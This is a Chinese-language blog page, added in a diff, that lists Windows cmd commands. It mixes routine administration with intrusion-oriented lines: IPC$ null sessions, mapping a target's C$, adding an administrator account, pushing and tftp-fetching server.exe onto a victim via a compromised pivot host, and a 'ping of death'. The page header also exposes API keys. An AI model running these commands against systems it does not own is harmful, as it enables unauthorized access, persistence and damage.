@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="Dong Yuanxin">
+  
+  
+  <title>cmd命令 | hcncn6</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="Hexo, Theme-AD">
+  
+
+  
+  <meta name="description" content="hcncn小站">
+
+  
+
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":false},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-11-1",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Dong Yuanxin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">博客</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 持续更新中</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/dongyuanxin/" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2019-01-01
+    </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    cmd命令
+  </h1>
+  
+  <article class="passage-article">
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"> cmd命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net use $&quot;&gt;\\ip\ipc$Content$nbsp;&quot; &quot; /user:&quot; &quot; 建立IPC空链接  </span><br><span class="line">net use $&quot;&gt;\\ip\ipc$Content$nbsp;&quot;密码&quot; /user:&quot;用户名&quot; 建立IPC非空链接  </span><br><span class="line">net use h: $&quot;&gt;\\ip\c$Content$nbsp;&quot;密码&quot; /user:&quot;用户名&quot; 直接登陆后映射对方C：到本地为H:  </span><br><span class="line">net use h: $&quot;&gt;\\ip\c$Content$nbsp;登陆后映射对方C：到本地为H:  </span><br><span class="line">net use $&quot;&gt;\\ip\ipc$Content$nbsp;/del 删除IPC链接  </span><br><span class="line">net use h: /del 删除映射对方到本地的为H:的映射  </span><br><span class="line">net user 用户名　密码　/add 建立用户  </span><br><span class="line">net user guest /active:yes 激活guest用户  </span><br><span class="line">net user 查看有哪些用户  </span><br><span class="line">net user 帐户名 查看帐户的属性  </span><br><span class="line">net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数  </span><br><span class="line">net start 查看开启了哪些服务  </span><br><span class="line">net start 服务名　 开启服务；(如:net start telnet， net start schedule)  </span><br><span class="line">net stop 服务名 停止某服务  </span><br><span class="line">net time \\目标ip 查看对方时间  </span><br><span class="line">net time \\目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息  </span><br><span class="line">net view 查看本地局域网内开启了哪些共享  </span><br><span class="line">net view \\ip 查看对方局域网内开启了哪些共享  </span><br><span class="line">net config 显示系统网络设置  </span><br><span class="line">net logoff 断开连接的共享  </span><br><span class="line">net pause 服务名 暂停某服务  </span><br><span class="line">net send ip &quot;文本信息&quot; 向对方发信息  </span><br><span class="line">net ver 局域网内正在使用的网络连接类型和信息  </span><br><span class="line">net share 查看本地开启的共享  </span><br><span class="line">net share ipc$Content$nbsp;开启ipc$共享  </span><br><span class="line">net share ipc$Content$nbsp;/del 删除ipc$共享  </span><br><span class="line">net share c$Content$nbsp;/del 删除C：共享  </span><br><span class="line">net user guest 12345 用guest用户登陆后用将密码改为12345  </span><br><span class="line">net password 密码 更改系统登陆密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">netstat -a 查看开启了哪些端口,常用netstat -an  </span><br><span class="line">netstat -n 查看端口的网络连接情况，常用netstat -an  </span><br><span class="line">netstat -v 查看正在进行的工作  </span><br><span class="line">netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）  </span><br><span class="line">netstat -s 查看正在使用的所有协议使用情况  </span><br><span class="line">nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。  </span><br><span class="line">ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。  </span><br><span class="line">ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)  </span><br><span class="line">ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息  </span><br><span class="line">tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)  </span><br><span class="line">kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)  </span><br><span class="line">del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）  </span><br><span class="line">move 盘符\路径\要移动的文件名　存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖  </span><br><span class="line">fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，&quot;&gt; &quot;和&quot;&gt; &gt;&quot; 是重定向命令  </span><br><span class="line">at id号 开启已注册的某个计划任务  </span><br><span class="line">at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止  </span><br><span class="line">at id号 /delete 停止某个已注册的计划任务  </span><br><span class="line">at 查看所有的计划任务  </span><br><span class="line">at \\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机  </span><br><span class="line">finger username @host 查看最近有哪些用户登陆  </span><br><span class="line">telnet ip 端口 远和登陆服务器,默认端口为23  </span><br><span class="line">open ip 连接到IP（属telnet登陆后的命令）  </span><br><span class="line">telnet 在本机上直接键入telnet 将进入本机的telnet  </span><br><span class="line">copy 路径\文件名1　路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件  </span><br><span class="line">copy c:\srv.exe $&quot;&gt;\\ip\admin$Content$nbsp;复制本地c:\srv.exe到对方的admin下  </span><br><span class="line">cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件  </span><br><span class="line">copy $\svv.exe&quot;&gt;\\ip\admin$\svv.exe c:\ 或:copy\\ip\admin$\*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：  </span><br><span class="line">xcopy 要复制的文件或目录树　目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件  </span><br><span class="line">tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe 登陆后，将“IP”的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送  </span><br><span class="line">tftp -i 对方IP　put c:\server.exe 登陆后，上传本地c:\server.exe至主机  </span><br><span class="line">ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)  </span><br><span class="line">route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface  </span><br><span class="line">arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息  </span><br><span class="line">start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令  </span><br><span class="line">mem 查看cpu使用情况  </span><br><span class="line">attrib 文件名(目录名) 查看某文件（目录）的属性  </span><br><span class="line">attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性  </span><br><span class="line">dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间  </span><br><span class="line">date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间  </span><br><span class="line">set 指定环境变量名称=要指派给变量的字符 设置环境变量  </span><br><span class="line">set 显示当前所有的环境变量  </span><br><span class="line">set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量  </span><br><span class="line">pause 暂停批处理程序，并显示出：请按任意键继续....  </span><br><span class="line">if 在批处理程序中执行条件处理（更多说明见if命令及变量）  </span><br><span class="line">goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）  </span><br><span class="line">call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）  </span><br><span class="line">for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）  </span><br><span class="line">echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置  </span><br><span class="line">echo 信息 在屏幕上显示出信息  </span><br><span class="line">echo 信息 &gt;&gt; pass.txt 将&quot;信息&quot;保存到pass.txt文件中  </span><br><span class="line">findstr &quot;Hello&quot; aa.txt 在aa.txt文件中寻找字符串hello  </span><br><span class="line">find 文件名 查找某文件  </span><br><span class="line">title 标题名字 更改CMD窗口标题名字  </span><br><span class="line">color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白  </span><br><span class="line">prompt 名称 更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\ )  </span><br><span class="line">print 文件名 打印文本文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ver 在DOS窗口下显示版本信息  </span><br><span class="line">winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）  </span><br><span class="line">format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS  </span><br><span class="line">md　目录名 创建目录  </span><br><span class="line">replace 源文件　要替换文件的目录 替换文件  </span><br><span class="line">ren 原文件名　新文件名 重命名文件名  </span><br><span class="line">tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称  </span><br><span class="line">type 文件名 显示文本文件的内容  </span><br><span class="line">more 文件名 逐屏显示输出文件  </span><br><span class="line">doskey 要锁定的命令＝字符  </span><br><span class="line">doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">doskey dir=  </span><br><span class="line">taskmgr 调出任务管理器  </span><br><span class="line">chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误  </span><br><span class="line">tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口  </span><br><span class="line">exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe  </span><br><span class="line">path 路径\可执行文件的文件名 为可执行文件设置一个路径。  </span><br><span class="line">cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?  </span><br><span class="line">regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；  </span><br><span class="line">regedit /e 注册表文件名 导出注册表  </span><br><span class="line">cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.txt /D pub 设定d:\test.txt拒绝pub用户访问。  </span><br><span class="line">cacls 文件名 查看文件的访问用户权限列表  </span><br><span class="line">REM 文本内容 在批处理文件中添加注解  </span><br><span class="line">netsh 查看或更改本地网络配置情况</span><br></pre></td></tr></table></figure>
+
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: hcncn</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://hcncn6.github.io/2019/01/01/内网/cmd命令/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2019/01/01/Meterpreter/Mestasploit 后渗透/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2019/01/01/Meterpreter/MSF基本使用和控制台命令/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
